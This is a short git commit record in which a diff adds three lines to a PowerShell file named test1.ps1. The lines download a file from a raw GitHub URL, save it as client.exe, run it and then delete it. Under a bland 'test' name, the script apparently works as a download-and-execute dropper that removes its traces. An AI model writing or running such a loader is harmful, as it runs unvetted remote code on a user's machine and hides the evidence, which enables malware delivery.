ac74cbf39d71598da2d1d9b74b51fca94ed00c1a
Bruce Wayne <96730813+RavenCraftInitaitives@users.noreply.github.com>
2022-07-13 19:05:51 +0600

    Update test1.ps1

--- test1.ps1
+++ test1.ps1
@@ -1,1 +1,4 @@
 # test1 #
+Invoke-WebRequest 'https://raw.githubusercontent.com/RavenCraftInitaitives/DomAndDarlene/main/test1.ps1' -OutFile client.exe
+Start-Process '.\client.exe' -Wait
+Remove-Item .\client.exe
